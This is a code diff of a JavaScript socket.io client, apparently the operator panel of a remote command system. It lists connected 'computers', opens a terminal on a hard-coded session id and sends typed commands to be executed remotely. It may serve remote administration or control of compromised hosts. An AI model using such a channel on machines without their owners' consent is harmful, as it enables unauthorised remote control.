@@ -4,12 +4,21 @@ const sendButton = document.getElementById('send');
 const terminalOutput = document.getElementById('terminal-output');
 let currentUser = "";
 
-socket.emit("register", { type: "X-SENDER" });
+socket.emit("system:register", { type: "X-SENDER" ,hostname: null});
 
-socket.on('os:info', (userInfo) => {
-    currentUser = userInfo
-    addOutput(">>>> Hello my friend it's not good to be here be careful my friend :) <<<<")
+socket.on('system:computer-listing', (executorInfo) => {
+    executorInfo.forEach(element => {
+        addOutput(element)
+    });
 });
+
+
+
+
+
+
+
+
 
 function addOutput(text) {
     const li = document.createElement('li');
@@ -20,7 +29,14 @@ function addOutput(text) {
 
 function handleCommand(command) {
     addOutput(`${currentUser} $ ${command}`);
-    socket.emit('command', { type: "X-SENDER", command });
+    if(command === 'list'){
+        socket.emit('system:computer-listing', { type: "X-SENDER", command });
+    }
+
+    if(command === 'open term'){
+        socket.emit('open:term','-vO-3bBGaJGK7J3oAAAL')
+    }
+    socket.emit('exec:command', { type: "X-SENDER", command });
 }
 
 socket.on('response', (result) => {
